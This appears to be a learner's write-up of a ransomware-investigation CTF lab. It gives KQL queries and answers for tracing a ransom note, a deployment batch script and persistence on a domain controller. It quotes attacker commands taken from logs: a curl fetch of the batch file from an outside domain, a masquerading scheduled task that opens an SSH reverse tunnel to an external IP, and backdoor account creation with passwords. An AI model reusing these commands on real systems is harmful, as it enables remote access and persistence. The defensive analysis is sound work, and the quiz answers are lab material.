Ship ahoy! An Unusual Ransomware Investigation
10
PTS
Section 1: Brainz 4 life 🧠
▸
Q1

FokkeBV, a maritime shipping company, has been ransomed!

Time to step up and uncover how it all happened 🕵️

You've been provided with a redacted copy of the ransom note.

What is the filename of the ransom note?

z0mbiz_ate_uR_f!lez.txt

S1Q2

With that piece of information, we can dive into the data on ADX and start our investigation.

First, let's get a closer look at that file and record some details. A hash for example would be a nice addition to the table of IOCs of a report.

What is the sha256 of the ransom note?

search *
| distinct $table

InboundNetworkEvents
Email
NetworkFlow
PassiveDns
DomainRegistrations
FileCreationEvents
AuthenticationEvents
Employees
DeviceInfo
DnsEvents
OutboundNetworkEvents
SecurityAlerts
ProcessEvents

the file has been downloaded

FileCreationEvents
| where path contains "z0mbiz_ate_uR_f!lez.txt"
| distinct sha256

4e10421ccbd37461dd51c59e719e401ca3bcb6291cabdccccbe3343cd5e43755

S1Q3

Building a timeline is also of importance: it helps us see the full picture, and it helps our report readers get a quick understanding of the attack path.
So we need to know when that file first and last appeared. Don't forget to take notes as you go 📝

When was the ransom note first created?

FileCreationEvents
| where path contains "z0mbiz_ate_uR_f!lez.txt"
| distinct username //160

FileCreationEvents
| where path contains "z0mbiz_ate_uR_f!lez.txt"
| distinct  path 

C:\brmcneill\Desktop\z0mbiz_ate_uR_f!lez.txt

FileCreationEvents
| where path contains "z0mbiz_ate_uR_f!lez.txt"
| order by timestamp asc

firstime created

10/27/2025, 9:17:44 AM	XRGA-LAPTOP	licarlson

last time created

10/28/2025, 10:53:19 AM AHX7-DESKTOP	anlacasse

S1Q4

Wait, the note appeared 166 times!!! That's probably, like, the whole company!! 😱

Which means we should be able to find encrypted files on any of those 166 machines.

What file extension is added to existing files once they've been encrypted?

check what happend after the files is downloaded

FileCreationEvents
| where timestamp >= datetime(2025-10-27T09:17:44.000Z)
| where username contains "licarlson"

we see after the file is downloaded file entcrypted with extension Z0mbyt3

//Z0mbyt3

S1q5

Let's see if we can find what happened on those 166 machines. There must be commands that have been run on all of them.

How many distinct commands can you find?

check process event and see what command we have 166 times

ProcessEvents
| summarize commandCount = count() by process_commandline
| where commandCount == 166
//20

S1q6

That's a lot of commands. They can be divided into two categories:

commands run to inhibit recovery, essential to the threat actor for maximum impact
commands to clean up their traces, only seen when the threat actor wants to be sneaky
Again, let's record when those commands are first seen and last seen.
When was the last command run?

let A=
ProcessEvents
| summarize commandCount = count() by process_commandline
| where commandCount == 166
| project process_commandline;
ProcessEvents
| where process_commandline has_any (A)
| order by timestamp desc

10/28/2025, 10:59:26 AM	z0mbytes.bat  reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f    VPI6-LAPTOP	veromo

///10/28/2025, 10:59:26 AM


S1Q7

I doubt the threat actor typed all those commands on all those machines by hand. They must have had a script ready.

Which means you should be able to find something all those commands have in common…

What is the name of the script?

let A=
ProcessEvents
| summarize commandCount = count() by process_commandline
| where commandCount == 166
| project process_commandline;
ProcessEvents
| where process_commandline has_any (A)
| distinct parent_process_name

//z0mbytes.bat

S1q8

Don't forget to also take note of its sha256 for the IOCs!

This batch file didn't appear out of thin air. There must be a trace of it somewhere else.

On which hostname was the file created?

FileCreationEvents
| where path contains "z0mbytes.bat"


10/26/2025, 9:12:49 AM	DC_offices	IT_god_mode

C:\Windows\Temp\z0mbytes.bat

//DC_offices

S1q9

Hu-ho, that's a domain controller. Which tracks, that's often from there that threat actor deploy ransomware on the whole network.

Take note of additional info, like the username used and the timestamp.
In fact, let's take that username to pivot and see what happened on that DC.

What domain did they download the batch file from?

username IT_god_mode
hostname  DC_offices

Employees
| where username contains "DC_offices"

nothing


FileCreationEvents
| where hostname  contains "DC_offices"
| where timestamp >= datetime(10/26/2025, 9:12:49 AM)




ProcessEvents
| where username   contains "IT_god_mode"
| where process_commandline  contains "z0mbytes.bat"

curl -s -O traintofokke.boo/n0mnom/z0mbytes.bat
2025-10-27T09:12:48.000Z

//traintofokke.boo


S1Q10

What is the name of the user they created for persistence on the DC?

ProcessEvents
| where username   contains "IT_god_mode"
| where process_commandline  contains "z0mbytes.bat"


hostname

DC_offices
DC_warehouses

From my previous work persitence word to search + word create

ProcessEvents
| where process_commandline has_any (
    "schtasks",
    "Register-ScheduledTask",
    "CurrentVersion\\Run",
    "RunOnce",
    "New-Service",
    "sc.exe create"
)
| where process_commandline contains "create"

EWSI-LAPTOP	anbonny

schtasks /create /ru system /sc hourly /st 14:00 /f /tn GoogleUpdateTaskMachine /tr cmd /c for /L %N in () do (C:\ProgramData\ssh\ssh.exe -o "StrictHostKeyChecking no" root@51.81.42.234 -p 443 -R 25369 -NCqf -i "C:\Windows\temp\syslog.txt" & timeout /t 15)

1. Persistence Technique

The persistence mechanism is:
schtasks /create

Suspicious parameters:

Parameter	Meaning	Security relevance
/ru system	Run as SYSTEM account	High privilege execution
/sc hourly	Execute every hour	Persistence
/st 14:00	Start time	Task activation time
/f	Force overwrite existing task	Avoids prompts
/tn GoogleUpdateTaskMachine	Task name	Masquerading
/tr ...	Command executed	Payload

2. Masquerading
Suspicious task name:

GoogleUpdateTaskMachine
This attempts to look like a legitimate Google updater task.

The command establishes:

1-SYSTEM-level scheduled task persistence
2-Masquerading as Google Update
3-Outbound SSH reverse tunnel
4-Potential remote access channel

remote access implant/backdoor persistence mechanism,

//////there is no username created

we have to search for 

net user <username> <password> /add

or 

net localgroup administrators <username> /add


ProcessEvents

| where process_commandline contains "localgroup"
or process_commandline contains "" "net user"
| distinct process_commandline

//ouput

net user cordyceps !nf3cTed /add
net user orka /delete
net user
net localgroup
net user Administrator
net user orka Lev14Th4n /add
net localgroup administrators orka /add

check the time of the name creation just before downloading the batch file from

ProcessEvents
| where username   contains "IT_god_mode"
| where process_commandline contains "localgroup"
or process_commandline contains "net user"
| where timestamp <= datetime(2025-10-27T09:12:48.000Z)
| distinct process_commandline



